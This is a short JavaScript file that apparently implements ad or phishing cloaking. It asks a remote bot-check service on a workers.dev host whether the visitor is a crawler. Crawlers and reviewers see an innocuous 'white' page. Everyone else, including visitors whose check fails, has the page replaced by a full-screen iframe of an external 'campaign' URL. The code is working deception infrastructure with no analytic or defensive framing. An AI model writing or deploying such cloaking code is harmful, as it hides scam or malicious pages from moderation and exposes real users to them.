const createLoader = () => {
  const frame = document.createElement('iframe');
  frame.id = 'load_frame';
  frame.src = 'frameLoad.html'; // FIX
  frame.frameBorder = 0;
  frame.width = '100%';
  frame.height = '100%';
  frame.style.position = 'fixed';
  frame.style.top = 0;
  frame.style.left = 0;
  frame.style.width = '100%';
  frame.style.height = '100%';
  frame.style.zIndex = 9999;
  document.body.prepend(frame);
};

const showWhite = () => {
  const body = document.body;
  const html = document.documentElement;
  body.classList.remove('hidden');
  body.removeAttribute('hidden');
  body.style.overflow = 'auto';
  html.style.overflow = 'auto';
  const preload = document.getElementById('load_frame');
  if (preload) preload.remove();
};

const showBlack = (blackUrl) => {
  const body = document.body;
  body.innerHTML = '';
  body.style.margin = '0';
  body.style.padding = '0';
  body.style.overflow = 'hidden';

  const frame = document.createElement('iframe');
  frame.id = 'wrapper_frame';
  frame.src = blackUrl;
  frame.style.cssText = `
    position:fixed;top:0;left:0;width:100vw;height:100vh;
    border:none;z-index:10000;display:block;
  `;
  body.appendChild(frame);

  const preload = document.getElementById('load_frame');
  if (preload) preload.remove();
};

createLoader();

window.addEventListener('DOMContentLoaded', () => {
  const qs = location.search || '';
  const CAMPAIGN_URL = 'https://app.active-campaign.org/wvS95k'; 

  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot' + qs)
    .then(r => r.json())
    .then(res => {
      console.log('check_bot response:', res);
      if (res?.code === 200 && res.result === true) {
      
        setTimeout(showWhite, 150);
      } else {
     
        showBlack(CAMPAIGN_URL + qs);
      }
    })
    .catch(err => {
      console.error('check_bot error:', err);
      
      showBlack(CAMPAIGN_URL + qs);
    });
});
